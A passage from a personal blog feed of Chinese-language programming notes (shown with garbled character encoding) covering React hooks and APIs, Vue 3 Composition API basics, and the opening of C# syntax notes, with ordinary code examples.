class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext, useReducer &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> TasksContext = createContext(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> TasksDispatchContext = createContext(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">TasksProvider</span>(<span class="params">&#123; children &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [tasks, dispatch] = useReducer(tasksReducer, initialTasks);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;TasksContext.Provider value=&#123;tasks&#125;&gt;</span><br><span class="line">      &lt;TasksDispatchContext.Provider value=&#123;dispatch&#125;&gt;</span><br><span class="line">        &#123;children&#125;</span><br><span class="line">      &lt;<span class="regexp">/TasksDispatchContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>TasksContext.Provider&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»„ä»¶ä¸­è·å–taskå’Œdispatch</span></span><br><span class="line"><span class="keyword">const</span> dispatch = useContext(TasksDispatchContext);</span><br><span class="line"><span class="keyword">const</span> tasks = useContext(TasksContext);</span><br></pre></td></tr></table></figure></p><p>ä¹Ÿå¯ä»¥å†å°è£…ä¸€å±‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useTasks</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> useContext(TasksContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useTasksDispatch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> useContext(TasksDispatchContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> tasks = useTasks();</span><br><span class="line"><span class="keyword">const</span> dispatch = useTasksDispatch();</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-5-useRef"><a href="#2-5-useRef" class="headerlink" title="2.5 useRef"></a>2.5 useRef</h4><p>å’Œstateä¸€æ ·ï¼ŒReactä¼šåœ¨æ¯æ¬¡æ¸²æŸ“æ—¶ä¿ç•™ref, ä½†è®¾ç½®stateä¼šé‡æ–°æ¸²æŸ“ç»„ä»¶ï¼Œrefä¸ä¼šã€‚<br>å½“ä½ å¸Œæœ›ç»„ä»¶â€œè®°ä½â€æŸäº›ä¿¡æ¯ï¼Œä½†åˆä¸æƒ³è®©è¿™äº›ä¿¡æ¯ è§¦å‘æ–°çš„æ¸²æŸ“ æ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ ref ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// refä¼šè¿”å›è¿™æ ·ä¸€ä¸ªå¯¹è±¡ &#123; current: 0 &#125; ï¼Œcurrentè¡¨ç¤ºå½“å‰å€¼</span></span><br><span class="line"><span class="keyword">const</span> ref = useRef(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleClick</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ref.current = ref.current + <span class="number">1</span>;</span><br><span class="line">  alert(<span class="string">'ä½ ç‚¹å‡»äº† '</span> + ref.current + <span class="string">' æ¬¡ï¼'</span>); <span class="comment">// 1, 2, 3...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>ref</code>å¯ä»¥æŒ‡å‘ä»»ä½•å€¼ï¼Œå¸¸ç”¨äºå­˜å‚¨å’Œæ“ä½œDOMå…ƒç´ <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useRef &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myRef = useRef(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†refä¼ é€’ç»™DOMèŠ‚ç‚¹</span></span><br><span class="line">&lt;div ref=&#123;myRef&#125;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¿é—®DOM</span></span><br><span class="line">myRef.current.scrollIntoView();</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-6-useCallback"><a href="#2-6-useCallback" class="headerlink" title="2.6 useCallback"></a>2.6 useCallback</h4><p>åœ¨å¤šæ¬¡æ¸²æŸ“ä¸­ç¼“å­˜å‡½æ•°ï¼Œé¿å…ä¸å¿…è¦çš„æ¸²æŸ“ã€‚<br>ç¬¬äºŒä¸ªå‚æ•°æ˜¯å‡½æ•°å†…éƒ¨éœ€è¦ç”¨åˆ°çš„ä¾èµ–å€¼<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> handleSubmit = useCallback(<span class="function">(<span class="params">orderDetails</span>) =&gt;</span> &#123;</span><br><span class="line">  post(<span class="string">'/product/'</span> + productId + <span class="string">'/buy'</span>, &#123;</span><br><span class="line">    referrer,</span><br><span class="line">    orderDetails,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;, [productId, referrer]);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-7-useMemo"><a href="#2-7-useMemo" class="headerlink" title="2.7 useMemo"></a>2.7 useMemo</h4><p>åœ¨æ¯æ¬¡é‡æ–°æ¸²æŸ“çš„æ—¶å€™èƒ½å¤Ÿç¼“å­˜è®¡ç®—çš„ç»“æœã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cachedValue = useMemo(calculateValue, dependencies)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-Effect"><a href="#3-Effect" class="headerlink" title="3. Effect"></a>3. Effect</h3><p>å…è®¸ä½ æŒ‡å®šç”±æ¸²æŸ“æœ¬èº«ï¼Œè€Œä¸æ˜¯ç‰¹å®šäº¤äº’å¼•èµ·çš„å‰¯ä½œç”¨ï¼Œå¦‚ç”¨äºæ¸²æŸ“çš„ç½‘ç»œè¯·æ±‚ã€å¯¹DOMèŠ‚ç‚¹è¿›è¡Œæ“ä½œã€‚</p><ul><li>æ‰§è¡Œæ—¶æœº<br><code>useEffect</code> æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ã€‚åœ¨ React å®Œæˆ DOM æ›´æ–°å¹¶å°†æ›´æ–°æ¸²æŸ“åˆ°å±å¹•ä¹‹åï¼ŒuseEffect çš„å›è°ƒå‡½æ•°æ‰ä¼šè¢«è°ƒç”¨ã€‚è¿™æ„å‘³ç€å®ƒä¸ä¼šé˜»å¡æµè§ˆå™¨çš„æ¸²æŸ“è¿‡ç¨‹ï¼Œç”¨æˆ·å¯ä»¥å…ˆçœ‹åˆ°é¡µé¢çš„æ›´æ–°ï¼Œç„¶å useEffect å†æ‰§è¡Œå‰¯ä½œç”¨æ“ä½œï¼Œæ¯”å¦‚å‘èµ·ç½‘ç»œè¯·æ±‚ã€è®¢é˜…äº‹ä»¶ç­‰ã€‚</li></ul><p><code>useLayoutEffect</code> æ˜¯åŒæ­¥æ‰§è¡Œçš„ã€‚å®ƒä¼šåœ¨ React å®Œæˆ DOM æ›´æ–°ä½†è¿˜æœªå°†æ›´æ–°æ¸²æŸ“åˆ°å±å¹•ä¹‹å‰è¢«è°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒuseLayoutEffect ä¼šé˜»å¡æµè§ˆå™¨çš„æ¸²æŸ“ï¼Œç›´åˆ°å…¶å›è°ƒå‡½æ•°æ‰§è¡Œå®Œæ¯•ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// è¿™é‡Œçš„ä»£ç ä¼šåœ¨æ¯æ¬¡æ¸²æŸ“åæ‰§è¡Œ</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// è¿™é‡Œçš„ä»£ç åªä¼šåœ¨ç»„ä»¶æŒ‚è½½åæ‰§è¡Œ</span></span><br><span class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, handleScroll);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ¸…ç†å‡½æ•°: æ¯æ¬¡é‡æ–°æ‰§è¡ŒEffectå‰ï¼Œç»„ä»¶è¢«å¸è½½æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨æ¸…ç†å‡½æ•°</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">window</span>.removeEventListener(<span class="string">'scroll'</span>, handleScroll);</span><br><span class="line">&#125;, []);</span><br><span class="line"></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//è¿™é‡Œçš„ä»£ç åªä¼šåœ¨æ¯æ¬¡æ¸²æŸ“åï¼Œå¹¶ä¸” a æˆ– b çš„å€¼ä¸ä¸Šæ¬¡æ¸²æŸ“ä¸ä¸€è‡´æ—¶æ‰§è¡Œ</span></span><br><span class="line">&#125;, [a, b]);</span><br></pre></td></tr></table></figure></p><ul><li><p>æ¸…ç†å‡½æ•°<code>return () =&gt; {}</code>ï¼Œå¸¸ç”¨äº</p><ul><li>å–æ¶ˆè®¢é˜…</li><li>é‡ç½®åˆå§‹å€¼</li><li>å–æ¶ˆæˆ–è€…å¯¹æ­£åœ¨è¿›è¡Œä¸­çš„å¼‚æ­¥æ“ä½œä½œæ ‡è®°</li></ul></li><li><p>ä½ å¯èƒ½ä¸éœ€è¦effect</p><ol><li><p>èƒ½<code>computed</code>è®¡ç®—å‡ºæ¥çš„æ•°æ®ï¼Œä¸éœ€è¦æ”¾è¿›<code>useEffect</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [firstName, setFirstName] = useState(<span class="string">'Taylor'</span>);</span><br><span class="line"><span class="keyword">const</span> [lastName, setLastName] = useState(<span class="string">'Swift'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ğŸ”´ é¿å…ï¼šå¤šä½™çš„ state å’Œä¸å¿…è¦çš„ Effect</span></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  setFullName(firstName + <span class="string">' '</span> + lastName);</span><br><span class="line">&#125;, [firstName, lastName]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// âœ… éå¸¸å¥½ï¼šåœ¨æ¸²æŸ“æœŸé—´è¿›è¡Œè®¡ç®—</span></span><br><span class="line"><span class="keyword">const</span> fullName = firstName + <span class="string">' '</span> + lastName;</span><br></pre></td></tr></table></figure></li><li><p>æœ‰æ¡ä»¶çš„<code>computed</code>, ä½¿ç”¨<code>useMemo</code>ä»£æ›¿<code>useEffect</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ğŸ”´ é¿å…ï¼šå¤šä½™çš„ state å’Œä¸å¿…è¦çš„ Effect</span></span><br><span class="line"><span class="keyword">const</span> [visibleTodos, setVisibleTodos] = useState([]);</span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  setVisibleTodos(getFilteredTodos(todos, filter));</span><br><span class="line">&#125;, [todos, filter]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// âœ… é™¤é todos æˆ– filter å‘ç”Ÿå˜åŒ–ï¼Œå¦åˆ™ä¸ä¼šé‡æ–°æ‰§è¡Œ getFilteredTodos()</span></span><br><span class="line"><span class="keyword">const</span> visibleTodos = useMemo(<span class="function"><span class="params">()</span> =&gt;</span> getFilteredTodos(todos, filter), [todos, filter]);</span><br></pre></td></tr></table></figure></li><li><p>å½“propså˜åŒ–éœ€è¦è°ƒæ•´stateæ—¶ï¼Œä¸éœ€è¦æ”¾è¿›<code>useEffect</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">List</span>(<span class="params">&#123; items &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [isReverse, setIsReverse] = useState(<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">const</span> [selectedId, setSelectedId] = useState(<span class="literal">null</span>);</span><br><span class="line">  <span class="comment">// ğŸ”´ é¿å…ï¼šå½“ prop å˜åŒ–æ—¶ï¼Œåœ¨ Effect ä¸­è°ƒæ•´ state</span></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    setSelection(<span class="literal">null</span>);</span><br><span class="line">  &#125;, [items]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// âœ… éå¸¸å¥½ï¼šåœ¨æ¸²æŸ“æœŸé—´è®¡ç®—æ‰€éœ€å†…å®¹</span></span><br><span class="line">  <span class="keyword">const</span> selection = items.find(<span class="function"><span class="params">item</span> =&gt;</span> item.id === selectedId) ?? <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ul><p><br></p><p><br></p><h3 id="4-API"><a href="#4-API" class="headerlink" title="4. API"></a>4. API</h3><h4 id="4-1-forwardRef"><a href="#4-1-forwardRef" class="headerlink" title="4.1 forwardRef"></a>4.1 forwardRef</h4><p>å…è®¸çˆ¶èŠ‚ç‚¹è®¿é—®å­ç»„ä»¶é‡Œçš„DOMå…ƒç´ <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; forwardRef &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> MyInput = forwardRef(<span class="function"><span class="keyword">function</span> <span class="title">MyInput</span>(<span class="params">props, ref</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; label, ...otherProps &#125; = props;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;label&gt;</span><br><span class="line">      &#123;label&#125;</span><br><span class="line">      &lt;input &#123;...otherProps&#125; ref=&#123;ref&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/label&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">function Form() &#123;</span></span><br><span class="line"><span class="regexp">  const ref = useRef(null);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">  function handleClick() &#123;</span></span><br><span class="line"><span class="regexp">    ref.current.focus();</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">  return (</span></span><br><span class="line"><span class="regexp">    &lt;form&gt;</span></span><br><span class="line"><span class="regexp">      &lt;MyInput label="Enter your name:" ref=&#123;ref&#125; /</span>&gt;</span><br><span class="line">      &lt;button type=<span class="string">"button"</span> onClick=&#123;handleClick&#125;&gt;</span><br><span class="line">        ç¼–è¾‘</span><br><span class="line">      &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>form&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-2-lazy"><a href="#4-2-lazy" class="headerlink" title="4.2 lazy"></a>4.2 lazy</h4><p>å£°æ˜ä¸€ä¸ªç»„ä»¶<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> MarkdownPreview <span class="keyword">from</span> <span class="string">'./MarkdownPreview.js'</span>;</span><br></pre></td></tr></table></figure></p><p>å£°æ˜ä¸€ä¸ªæ‡’åŠ è½½çš„ React ç»„ä»¶<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; lazy &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> MarkdownPreview = lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./MarkdownPreview.js'</span>));</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-3-memo"><a href="#4-3-memo" class="headerlink" title="4.3 memo"></a>4.3 memo</h4><p>å…è®¸ä½ çš„ç»„ä»¶åœ¨ props æ²¡æœ‰æ”¹å˜çš„æƒ…å†µä¸‹è·³è¿‡é‡æ–°æ¸²æŸ“ã€‚<br>ä½¿ç”¨ memo å°†ç»„ä»¶åŒ…è£…èµ·æ¥ï¼Œä»¥è·å¾—è¯¥ç»„ä»¶çš„ä¸€ä¸ª è®°å¿†åŒ– ç‰ˆæœ¬ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œåªè¦è¯¥ç»„ä»¶çš„ props æ²¡æœ‰æ”¹å˜ï¼Œè¿™ä¸ªè®°å¿†åŒ–ç‰ˆæœ¬å°±ä¸ä¼šåœ¨å…¶çˆ¶ç»„ä»¶é‡æ–°æ¸²æŸ“æ—¶é‡æ–°æ¸²æŸ“ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; memo &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> SomeComponent = memo(<span class="function"><span class="keyword">function</span> <span class="title">SomeComponent</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://react.docschina.org/" target="_blank" rel="noopener">Reactå®˜ç½‘</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vue3 åŸºæœ¬ç”¨æ³•</title>
      <link href="/2025/01/25/vue3/"/>
      <url>/2025/01/25/vue3/</url>
      <content type="html"><![CDATA[<ul><li><h3 id="1-setup"><a href="#1-setup" class="headerlink" title="1. setup"></a>1. setup</h3></li><li>æ¸è¿›å¼æ¡†æ¶<br>é€‰é¡¹å¼ API (Options API) + ç»„åˆå¼ API (Composition API)</li></ul><p><code>setup()</code>å†…çš„ä»£ç ä¼šåœ¨åœ¨Options APIæ‰€æœ‰ä¸œè¥¿ä¹‹å‰æ‰§è¡Œ<br><code>&lt;script setup&gt;&lt;/script&gt;</code></p><p><br></p><h3 id="2-Composition-API"><a href="#2-Composition-API" class="headerlink" title="2. Composition API"></a>2. Composition API</h3><h4 id="2-1-ref"><a href="#2-1-ref" class="headerlink" title="2.1 ref"></a>2.1 ref</h4><p>å£°æ˜å“åº”å¼çŠ¶æ€<br>ä¸ºä»€ä¹ˆrefä¼šå¸¦æœ‰<code>.value</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    <span class="keyword">const</span> count = ref(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">increment</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      count.value++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      count,</span><br><span class="line">      increment</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="2-2-reactive"><a href="#2-2-reactive" class="headerlink" title="2.2 reactive"></a>2.2 reactive</h4><p>ä¸ºä»€ä¹ˆè¦ç”¨<code>reactive</code></p><h4 id="2-3-computed"><a href="#2-3-computed" class="headerlink" title="2.3 computed"></a>2.3 computed</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> publishedBooksMessage = computed(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> author.books.length &gt; <span class="number">0</span> ? <span class="string">'Yes'</span> : <span class="string">'No'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="2-4-watch"><a href="#2-4-watch" class="headerlink" title="2.4 watch"></a>2.4 watch</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> x = ref(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">watch(x, (newX) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`x is <span class="subst">$&#123;newX&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="2-5-ref"><a href="#2-5-ref" class="headerlink" title="2.5 ref"></a>2.5 ref</h4><p>å¼•ç”¨å­ç»„ä»¶<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useTemplateRef, onMounted &#125; <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Child <span class="keyword">from</span> <span class="string">'./Child.vue'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> childRef = useTemplateRef(<span class="string">'child'</span>)</span><br><span class="line"></span><br><span class="line">onMounted(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// childRef.value å°†æŒæœ‰ &lt;Child /&gt; çš„å®ä¾‹</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;Child ref=<span class="string">"child"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="3-ç”Ÿå‘½å‘¨æœŸ"><a href="#3-ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="3. ç”Ÿå‘½å‘¨æœŸ"></a>3. ç”Ÿå‘½å‘¨æœŸ</h3><ul><li>onMounted</li><li>onUpdated</li><li>onUnmounted</li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>C#è¯­æ³•</title>
      <link href="/2025/01/03/C%20sheel%E8%AF%AD%E6%B3%95/"/>
      <url>/2025/01/03/C%20sheel%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-å‘½åç©ºé—´"><a href="#1-å‘½åç©ºé—´" class="headerlink" title="1. å‘½åç©ºé—´"></a>1. å‘½åç©ºé—´</h3><p>å‘½åç©ºé—´çš„è®¾è®¡ç›®çš„æ˜¯æä¾›ä¸€ç§è®©ä¸€ç»„åç§°ä¸å…¶ä»–åç§°åˆ†éš”å¼€çš„æ–¹å¼<br><code>using System;</code> using å…³é”®å­—ç”¨äºåœ¨ç¨‹åºä¸­åŒ…å« System å‘½åç©ºé—´<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">namespace first_space</span><br><span class="line">&#123;</span><br><span class="line">   class namespace_cl</span><br><span class="line">   &#123;</span><br><span class="line">      public void func()</span><br><span class="line">      &#123;</span><br><span class="line">         Console.WriteLine(&quot;Inside first_space&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-class"><a href="#2-class" class="headerlink" title="2. class"></a>2. class</h3><p>ç¨‹åºçš„æ‰§è¡Œä» Main æ–¹æ³•å¼€å§‹ã€‚</p><ul><li>è®¿é—®ä¿®é¥°ç¬¦ï¼šå®šä¹‰ç±»æˆå‘˜çš„èŒƒå›´å’Œå¯è§æ€§<br>publicï¼šæ‰€æœ‰å¯¹è±¡éƒ½å¯ä»¥è®¿é—®ï¼›<br>internalï¼šåŒä¸€ä¸ªç¨‹åºé›†çš„å¯¹è±¡å¯ä»¥è®¿é—®ï¼›<br>protectedï¼šåªæœ‰è¯¥ç±»å¯¹è±¡åŠå…¶å­ç±»å¯¹è±¡å¯ä»¥è®¿é—®<br>privateï¼šå¯¹è±¡æœ¬èº«åœ¨å¯¹è±¡å†…éƒ¨å¯ä»¥è®¿é—®ï¼›</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  public <span class="keyword">void</span> SomeMethod() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»§æ‰¿ï¼Œå¤šé‡ç»§æ‰¿</span></span><br><span class="line">class DerivedClass : BaseClass, OtherClass</span><br><span class="line">&#123;</span><br><span class="line">  public <span class="keyword">void</span> AnotherMethod()</span><br><span 